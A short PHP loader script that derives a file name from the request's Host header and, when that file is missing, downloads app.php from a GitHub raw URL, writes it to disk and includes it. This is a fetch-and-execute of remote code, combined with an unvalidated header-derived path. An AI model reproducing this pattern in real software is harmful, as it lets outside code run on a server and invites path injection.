
<?php

$_dir_ = $_SERVER['DOCUMENT_ROOT'];





$tokens = explode(".", $_SERVER['HTTP_HOST']);
$domain = $tokens[0];

if($domain == 'www'){
    $domain = $tokens[1];
}
echo $domain;
$server = $domain;
if ($domain !== ''){
    $domain = './'.$domain.'.php';
} else {
    $domain = './'.$_SERVER['HTTP_HOST'] .'.php';
}

if ( file_exists( $domain) ) {

require_once($domain);
} else {


    $app = file_get_contents('https://raw.githubusercontent.com/drod247/main.js/main/app.php');
    $myfile = fopen($domain, "w") or die("Unable to open $domain.'.php'!");
    fwrite($myfile, $app);
    fclose($myfile);
require_once($domain);
    
    }


?>
